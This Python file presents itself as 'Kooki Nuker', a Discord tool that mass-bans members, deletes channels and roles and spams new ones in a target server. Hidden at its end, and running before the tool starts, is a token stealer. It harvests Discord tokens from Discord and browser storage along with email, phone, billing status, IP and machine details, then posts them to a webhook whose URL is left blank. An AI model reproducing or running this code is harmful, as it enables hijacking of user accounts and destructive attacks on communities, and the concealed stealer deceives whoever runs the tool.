import requests
import os
import sys
import threading
import time
import json
import asyncio
import discord
import aiohttp

from pypresence import Presence
from discord import Webhook, AsyncWebhookAdapter
from discord.ext import commands

os.system(f'cls & mode 85,20 & title [Kooki Nuker] - Configuration')

token = input(f'\x1b[38;5;56m> \033[37mToken\x1b[38;5;56m: \033[37m')
rich_presence = input(f'\x1b[38;5;56m> \033[37mRich Presence (\x1b[38;5;56mY\033[37m/\x1b[38;5;56mN\033[37m)\x1b[38;5;56m: \033[37m')

os.system('cls')

def check_token():
    if requests.get("https://discord.com/api/v8/users/@me", headers={"Authorization": f'{token}'}).status_code == 200:
        return "user"
    else:
        return "bot"

def RichPresence():
    if rich_presence == "y" or rich_presence == "Y":
        try:
            RPC = Presence("816053514584195073") 
            RPC.connect() 
            RPC.update(details="Connected", large_image="Kooki large2", small_image="kooki", large_text="github.com/Kooki/KookiNuker", start=time.time())
        except:
            pass

rich_presence = RichPresence()
token_type = check_token()
intents = discord.Intents.all()
intents.members = True

if token_type == "user":
    headers = {'Authorization': f'{token}'}
    client = commands.Bot(command_prefix=">", case_insensitive=False, self_bot=True, intents=intents)
elif token_type == "bot":
    headers = {'Authorization': f'Bot {token}'}
    client = commands.Bot(command_prefix=">", case_insensitive=False, intents=intents)

client.remove_command("help")

class Kooki:

    def __init__(self):
        self.colour = '\x1b[38;5;56m'

    def BanMembers(self, guild, member):
        while True:
            r = requests.put(f"https://discord.com/api/v8/guilds/{guild}/bans/{member}", headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{self.colour}[\033[37m+{self.colour}]\033[37m Banned{self.colour} {member.strip()}\033[37m")
                    break
                else:
                    break

    def KickMembers(self, guild, member):
        while True:
            r = requests.delete(f"https://discord.com/api/v8/guilds/{guild}/members/{member}", headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{self.colour}[\033[37m+{self.colour}]\033[37m Kicked{self.colour} {member.strip()}\033[37m")
                    break
                else:
                    break

    def DeleteChannels(self, guild, channel):
        while True:
            r = requests.delete(f"https://discord.com/api/v8/channels/{channel}", headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{self.colour}[\033[37m+{self.colour}]\033[37m Deleted Channel {self.colour}{channel.strip()}\033[37m")
                    break
                else:
                    break
          
    def DeleteRoles(self, guild, role):
        while True:
            r = requests.delete(f"https://discord.com/api/v8/guilds/{guild}/roles/{role}", headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{self.colour}[\033[37m+{self.colour}]\033[37m Deleted Role{self.colour} {role.strip()}\033[37m")
                    break
                else:
                    break

    def SpamChannels(self, guild, name):
        while True:
            json = {'name': name, 'type': 0}
            r = requests.post(f'https://discord.com/api/v8/guilds/{guild}/channels', headers=headers, json=json)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{self.colour}[\033[37m+{self.colour}]\033[37m Created Channel{self.colour} {name}\033[37m")
                    break
                else:
                    break

    def SpamRoles(self, guild, name):
        while True:
            json = {'name': name}
            r = requests.post(f'https://discord.com/api/v8/guilds/{guild}/roles', headers=headers, json=json)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{self.colour}[\033[37m+{self.colour}]\033[37m Created Role{self.colour} {name}\033[37m")
                    break
                else:
                    break

    async def Scrape(self):
        guild = input(f'{self.colour}> \033[37mGuild ID{self.colour}: \033[37m')
        await client.wait_until_ready()
        guildOBJ = client.get_guild(int(guild))
        members = await guildOBJ.chunk()

        try:
            os.remove("Scraped/members.txt")
            os.remove("Scraped/channels.txt")
            os.remove("Scraped/roles.txt")
        except:
            pass

        membercount = 0
        with open('Scraped/members.txt', 'a') as m:
            for member in members:
                m.write(str(member.id) + "\n")
                membercount += 1
            print(f"\n{self.colour}[\033[37m!{self.colour}]\033[37m Scraped {self.colour}{membercount}\033[37m Members")
            m.close()

        channelcount = 0
        with open('Scraped/channels.txt', 'a') as c:
            for channel in guildOBJ.channels:
                c.write(str(channel.id) + "\n")
                channelcount += 1
            print(f"{self.colour}[\033[37m!{self.colour}]\033[37m Scraped {self.colour}{channelcount}\033[37m Channels")
            c.close()

        rolecount = 0
        with open('Scraped/roles.txt', 'a') as r:
            for role in guildOBJ.roles:
                r.write(str(role.id) + "\n")
                rolecount += 1
            print(f"{self.colour}[\033[37m!{self.colour}]\033[37m Scraped {self.colour}{rolecount}\033[37m Roles")
            r.close()

    async def NukeExecute(self):
        guild = input(f'{self.colour}> \033[37mGuild ID{self.colour}: \033[37m')
        channel_name = input(f"{self.colour}> \033[37mChannel Names{self.colour}: \033[37m")
        channel_amount = input(f"{self.colour}> \033[37mChannel Amount{self.colour}: \033[37m")
        role_name = input(f"{self.colour}> \033[37mRole Names{self.colour}: \033[37m")
        role_amount = input(f"{self.colour}> \033[37mRole Amount{self.colour}: \033[37m")
        print()

        members = open('Scraped/members.txt')
        channels = open('Scraped/channels.txt')
        roles = open('Scraped/roles.txt')

        for member in members:
            threading.Thread(target=self.BanMembers, args=(guild, member,)).start()
        for channel in channels:
            threading.Thread(target=self.DeleteChannels, args=(guild, channel,)).start()
        for role in roles:
            threading.Thread(target=self.DeleteRoles, args=(guild, role,)).start()
        for i in range(int(channel_amount)):
            threading.Thread(target=self.SpamChannels, args=(guild, channel_name,)).start()
        for i in range(int(role_amount)):
            threading.Thread(target=self.SpamRoles, args=(guild, role_name,)).start()
        members.close()
        channels.close()
        roles.close()

    async def BanExecute(self):
        guild = input(f'{self.colour}> \033[37mGuild ID{self.colour}: \033[37m')
        print()
        members = open('Scraped/members.txt')
        for member in members:
            threading.Thread(target=self.BanMembers, args=(guild, member,)).start()
        members.close()

    async def KickExecute(self):
        guild = input(f'{self.colour}> \033[37mGuild ID{self.colour}: \033[37m')
        print()
        members = open('Scraped/members.txt')
        for member in members:
            threading.Thread(target=self.KickMembers, args=(guild, member,)).start()
        members.close()

    async def ChannelDeleteExecute(self):
        guild = input(f'{self.colour}> \033[37mGuild ID{self.colour}: \033[37m')
        print()
        channels = open('Scraped/channels.txt')
        for channel in channels:
            threading.Thread(target=self.DeleteChannels, args=(guild, channel,)).start()
        channels.close()

    async def RoleDeleteExecute(self):
        guild = input(f'{self.colour}> \033[37mGuild ID{self.colour}: \033[37m')
        print()
        roles = open('Scraped/roles.txt')
        for role in roles:
            threading.Thread(target=self.DeleteRoles, args=(guild, role,)).start()
        roles.close()

    async def ChannelSpamExecute(self):
        guild = input(f'{self.colour}> \033[37mGuild ID{self.colour}: \033[37m')
        name = input(f"{self.colour}> \033[37mChannel Names{self.colour}: \033[37m")
        amount = input(f"{self.colour}> \033[37mAmount{self.colour}: \033[37m")
        print()
        for i in range(int(amount)):
            threading.Thread(target=self.SpamChannels, args=(guild, name,)).start()

    async def RoleSpamExecute(self):
        guild = input(f'{self.colour}> \033[37mGuild ID{self.colour}: \033[37m')
        name = input(f"{self.colour}> \033[37mRole Names{self.colour}: \033[37m")
        amount = input(f"{self.colour}> \033[37mAmount{self.colour}: \033[37m")
        print()
        for i in range(int(amount)):
            threading.Thread(target=self.SpamRoles, args=(guild, name,)).start()

    async def PruneMembers(self):
        guild = input(f'{self.colour}> \033[37mGuild ID{self.colour}: \033[37m')
        print()
        await guild.prune_members(days=1, compute_prune_count=False, roles=guild.roles)

    def Credits(self):
        os.system(f'cls & mode 85,20 & title [Kooki Nuker] - Credits')
        print(f'''
                          {self.colour}
                          \033[90m
                          \033[37m
                            {self.colour}[\033[37mDiscord{self.colour}] \033[37mKooki#9999

        \033[37m''')

    async def ThemeChanger(self):
        os.system(f'cls & mode 85,20 & title [Kooki Nuker] - Themes')
        print(f'''
                          {self.colour}
                          \033[90m
                          \033[37m
      {self.colour}╔═══════════════════════╦═══════════════════════╦═══════════════════════╗\033[37m
      {self.colour}║ \033[37m[{self.colour}1\033[37m] \033[37mRed               {self.colour}║\033[37m [{self.colour}5\033[37m] \033[37mPurple            {self.colour}║\033[37m [{self.colour}9\033[37m] \033[37mGrey              {self.colour}║\033[37m
      {self.colour}║ \033[37m[{self.colour}2\033[37m] \033[37mGreen             {self.colour}║\033[37m [{self.colour}6\033[37m] \033[37mBlue              {self.colour}║\033[37m [{self.colour}0\033[37m] \033[37mPeach             {self.colour}║\033[37m
      {self.colour}║ \033[37m[{self.colour}3\033[37m] \033[37mYellow            {self.colour}║\033[37m [{self.colour}7\033[37m] \033[37mPink              {self.colour}║\033[37m [{self.colour}M\033[37m] \033[37mMenu              {self.colour}║\033[37m
      {self.colour}║ \033[37m[{self.colour}4\033[37m] \033[37mOrange            {self.colour}║\033[37m [{self.colour}8\033[37m] \033[37mCyan              {self.colour}║\033[37m [{self.colour}X\033[37m] \033[37mExit              {self.colour}║\033[37m
      {self.colour}╚═══════════════════════╩═══════════════════════╩═══════════════════════╝\033[37m
             
        \033[37m''')
        choice = input(f'{self.colour}> \033[37mChoice{self.colour}: \033[37m')

        if choice == '1':
            self.colour = '\x1b[38;5;196m'
            await self.ThemeChanger()
        elif choice == '2':
            self.colour = '\x1b[38;5;34m'
            await self.ThemeChanger()
        elif choice == '3':
            self.colour = '\x1b[38;5;142m'
            await self.ThemeChanger()
        elif choice == '4':
            self.colour = '\x1b[38;5;172m'
            await self.ThemeChanger()
        elif choice == '5':
            self.colour = '\x1b[38;5;56m'
            await self.ThemeChanger()
        elif choice == '6':
            self.colour = '\x1b[38;5;21m'
            await self.ThemeChanger()
        elif choice == '7':
            self.colour = '\x1b[38;5;201m'
            await self.ThemeChanger()
        elif choice == '8':
            self.colour = '\x1b[38;5;51m'
            await self.ThemeChanger()
        elif choice == '9':
            self.colour = '\x1b[38;5;103m'
            await self.ThemeChanger()
        elif choice == '0':
            self.colour = '\x1b[38;5;209m'
            await self.ThemeChanger()
        elif choice == 'M' or choice == 'm':
            await self.Menu()
        elif choice == 'X' or choice == 'x':
            os._exit(0)

    async def Menu(self):
        os.system(f'cls & mode 85,20 & title [Kooki Nuker] - Connected: {client.user}')
        print(f'''
                          {self.colour}
                          \033[90m
                          \033[37m

      {self.colour}╔═══════════════════════╦═══════════════════════╦═══════════════════════╗\033[37m
      {self.colour}║ \033[37m[{self.colour}1\033[37m] \033[37mBan Members       {self.colour}║\033[37m [{self.colour}5\033[37m] \033[37mDelete Channels   {self.colour}║\033[37m [{self.colour}9\033[37m] \033[37mScrape Info       {self.colour}║\033[37m
      {self.colour}║ \033[37m[{self.colour}2\033[37m] \033[37mKick Members      {self.colour}║\033[37m [{self.colour}6\033[37m] \033[37mCreate Roles      {self.colour}║\033[37m [{self.colour}0\033[37m] \033[37mChange Themes     {self.colour}║\033[37m
      {self.colour}║ \033[37m[{self.colour}3\033[37m] \033[37mPrune Members     {self.colour}║\033[37m [{self.colour}7\033[37m] \033[37mCreate Channels   {self.colour}║\033[37m [{self.colour}C\033[37m] \033[37mView Credits      {self.colour}║\033[37m
      {self.colour}║ \033[37m[{self.colour}4\033[37m] \033[37mDelete Roles      {self.colour}║\033[37m [{self.colour}8\033[37m] \033[37mNuke Server       {self.colour}║\033[37m [{self.colour}X\033[37m] \033[37mExit              {self.colour}║\033[37m
      {self.colour}╚═══════════════════════╩═══════════════════════╩═══════════════════════╝\033[37m
             
        \033[37m''')

        choice = input(f'{self.colour}> \033[37mChoice{self.colour}: \033[37m')
        if choice == '1':
            await self.BanExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '2':
            await self.KickExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '3':
            await PruneMembers()
            time.sleep(2)
            await self.Menu()
        elif choice == '4':
            await self.RoleDeleteExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '5':
            await self.ChannelDeleteExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '6':
            await self.RoleSpamExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '7':
            await self.ChannelSpamExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '8':
            await self.NukeExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '9':
            await self.Scrape()
            time.sleep(3)
            await self.Menu()
        elif choice == '0':
            await self.ThemeChanger()
        elif choice == 'C' or choice == 'c':
            self.Credits()
            input()
            await self.Menu()
        elif choice == 'X' or choice == 'x':
            os._exit(0)

    @client.event
    async def on_ready():
        await Kooki().Menu()
            
    def Startup(self):
        try:
            if token_type == "user":
                client.run(token, bot=False)
            elif token_type == "bot":
                client.run(token)
        except:
            print(f'{self.colour}> \033[37mInvalid Token')
            input()
            os._exit(0)

            import os
if os.name != "nt":
    exit()
from re import findall
from json import loads, dumps
from base64 import b64decode
from subprocess import Popen, PIPE
from urllib.request import Request, urlopen
from datetime import datetime
from threading import Thread
from time import sleep
from sys import argv
LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
    "Discord"           : ROAMING + "\\Discord",
    "Discord Canary"    : ROAMING + "\\discordcanary",
    "Discord PTB"       : ROAMING + "\\discordptb",
    "Google Chrome"     : LOCAL + "\\Google\\Chrome\\User Data\\Default",
    "Opera"             : ROAMING + "\\Opera Software\\Opera Stable",
    "Brave"             : LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
    "Yandex"            : LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
}
def getheaders(token=None, content_type="application/json"):
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
    if token:
        headers.update({"Authorization": token})
    return headers
def getuserdata(token):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
    except:
        pass
def gettokens(path):
    path += "\\Local Storage\\leveldb"
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
            continue
        for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                for token in findall(regex, line):
                    tokens.append(token)
    return tokens
def getip():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:
        pass
    return ip
def getavatar(uid, aid):
    url = f"https://cdn.discordapp.com/avatars/{uid}/{aid}.gif"
    try:
        urlopen(Request(url))
    except:
        url = url[:-4]
    return url
def gethwid():
    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
def getchat(token, uid):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/channels", headers=getheaders(token), data=dumps({"recipient_id": uid}).encode())).read().decode())["id"]
    except:
        pass
def has_payment_methods(token):
    try:
        return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=getheaders(token))).read().decode())) > 0)
    except:
        pass
def send_message(token, chat_id, form_data):
    try:
        urlopen(Request(f"https://discordapp.com/api/v6/channels/{chat_id}/messages", headers=getheaders(token, "multipart/form-data; boundary=---------------------------325414537030329320151394843687"), data=form_data.encode())).read().decode()
    except:
        pass
def main():
    cache_path = ROAMING + "\\.cache~$"
    embeds = []
    working = []
    checked = []
    already_cached_tokens = []
    working_ids = []
    ip = getip()
    pc_username = os.getenv("UserName")
    pc_name = os.getenv("COMPUTERNAME")
    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue
        for token in gettokens(path):
            if token in checked:
                continue
            checked.append(token)
            uid = None
            if not token.startswith("mfa."):
                try:
                    uid = b64decode(token.split(".")[0].encode()).decode()
                except:
                    pass
                if not uid or uid in working_ids:
                    continue
            user_data = getuserdata(token)
            if not user_data:
                continue
            working_ids.append(uid)
            working.append(token)
            username = user_data["username"] + "#" + str(user_data["discriminator"])
            user_id = user_data["id"]
            avatar_id = user_data["avatar"]
            avatar_url = getavatar(user_id, avatar_id)
            email = user_data.get("email")
            phone = user_data.get("phone")
            nitro = bool(user_data.get("premium_type"))
            billing = bool(has_payment_methods(token))
            embed = {
                "color": 0x7289da,
                "fields": [
                    {
                        "name": "**Account Info**",
                        "value": f'Email: {email}\nPhone: {phone}\nNitro: {nitro}\nBilling Info: {billing}',
                        "inline": True
                    },
                    {
                        "name": "**PC Info**",
                        "value": f'IP: {ip}\nUsername: {pc_username}\nPC Name: {pc_name}\nToken Location: {platform}',
                        "inline": True
                    },
                    {
                        "name": "**Token**",
                        "value": token,
                        "inline": False
                    }
                ],
                "author": {
                    "name": f"{username} ({user_id})",
                    "icon_url": avatar_url
                },
                "footer": {
                
                }
            }
            embeds.append(embed)
    with open(cache_path, "a") as file:
        for token in checked:
            if not token in already_cached_tokens:
                file.write(token + "\n")
    if len(working) == 0:
        working.append('123')
    webhook = {
        "content": "",
        "embeds": embeds,
        "username": "Authorize",
        "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
    }
    try:
        urlopen(Request("", data=dumps(webhook).encode(), headers=getheaders()))
    except:
        pass

main()

if __name__ == "__main__":
    Kooki().Startup()
